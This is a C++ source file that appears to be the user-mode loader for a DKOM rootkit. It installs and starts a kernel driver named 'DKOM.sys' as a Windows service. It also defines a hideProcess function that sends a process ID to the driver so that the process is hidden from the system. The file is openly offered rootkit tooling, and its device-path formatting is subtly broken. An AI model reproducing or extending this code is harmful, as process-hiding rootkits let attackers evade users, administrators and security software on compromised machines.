//#include <stdio.h>
#include <windows.h>
//#include <stdlib.h>
//#include <string.h>
#include <iostream>
#include "log.h"

namespace Logs
{
	Log* log;
}

bool loadSysFile(char* driverName, char* displayName);
bool hideProcess(char* driverName, int pid);

int main(int argc, char *argv[])
{
	Logs::log = new Log();
	Logs::log->WriteLine("\n\nstarted...\n");
	//if (argc < 2)
	//	printf("Not enougth arguments");
	//else
	char* driverName = "DKOM";
	char* displayName = "DKOM"; // TODO: put friendly name
	if (loadSysFile(driverName, displayName))//"friendly driver"))//argv[1]);
		printf("success");//hideProcess(driverName, 4); //(int)argv[1]);
	else
		printf("failure\n");
	char s[100];
	//std::cin >> s;

	return 0;
}

bool loadSysFile(char* driverName, char* displayName)
{
	char* frmtStr = new char[1024];
	// Open a handle to the SCM
	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scmHandle)
	{
		sprintf(frmtStr, "failed to open SCM(%d)\n", GetLastError());
		Logs::log->WriteLine(frmtStr);
		printf(frmtStr);
		return FALSE;
	}

	char currDir[515];
	GetCurrentDirectory(512, currDir);
	char path[1000];
	snprintf(path, 998, "%s\\%s.sys", currDir, driverName); // string formatting
	sprintf(frmtStr, "loading %s\n", path);
	Logs::log->Write(frmtStr);
	printf(frmtStr);

	SC_HANDLE driverHandle = CreateService(scmHandle, // Handle to SCManager
		driverName, // Service Name
		displayName, // Display Name
		SERVICE_ALL_ACCESS, // Desired Access
		SERVICE_KERNEL_DRIVER, // Service Type
		SERVICE_DEMAND_START, // Start Type
		SERVICE_ERROR_NORMAL, // Error Controle
		path, // Binary Path Name
		NULL, // Load OrderGroup
		NULL, // Tag Id
		NULL, // Dependencies
		NULL, // Service Start Name
		NULL); // Password

	if (!driverHandle)
	{
		if (GetLastError() == ERROR_SERVICE_EXISTS)// || GetLastError() == ERROR_ALREADY_EXISTS)
		{ // Service exists
			driverHandle = OpenService(scmHandle, driverName, SERVICE_ALL_ACCESS); // get a handle to the existing service handle
			if (!driverHandle)
			{
				sprintf(frmtStr, "couldn't get existing service handle(%d)\n", GetLastError());
				Logs::log->Write(frmtStr);
				printf(frmtStr);
				CloseServiceHandle(scmHandle);
				return FALSE;
			}
		}
		else
		{
			sprintf(frmtStr, "couldn't start service(%d)\n", GetLastError());
			Logs::log->Write(frmtStr);
			printf(frmtStr);
			CloseServiceHandle(scmHandle);
			return FALSE;
		}
	}
	sprintf(frmtStr, "driverHandle handled (%d)", driverHandle);
	Logs::log->WriteLine(frmtStr);
	printf(frmtStr);

	// start the Driver
	if (0 == StartService(driverHandle, 0, NULL) && ERROR_SERVICE_ALREADY_RUNNING != GetLastError())
	{
		sprintf(frmtStr, "couldn't start driver(%d)\n", GetLastError());
		Logs::log->Write(frmtStr);
		printf(frmtStr);
		CloseServiceHandle(scmHandle);
		CloseServiceHandle(driverHandle);
		return FALSE;
	}
	Logs::log->WriteLine("closing handles");
	printf("closing handles\n");
	CloseServiceHandle(scmHandle);
	CloseServiceHandle(driverHandle);
	return TRUE;
}

bool hideProcess(char * driverName, int pid)
{
	char* driverToOpen = new char[1024];
	sprintf(driverToOpen, "\\\\.\\", driverName); // "\\\\.\\DKOM" for example
	HANDLE hFile = CreateFile(driverToOpen, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.", GetLastError());
		return FALSE;
	}
	DWORD write;
	if (!WriteFile(hFile, &pid, sizeof(DWORD), &write, NULL)) // hide
	{
		printf("\nError: Unable to hide process (%d)\n", GetLastError());
		return FALSE;
	}
	else
		printf("\nProcess successfully hidden.\n");
	return TRUE;
}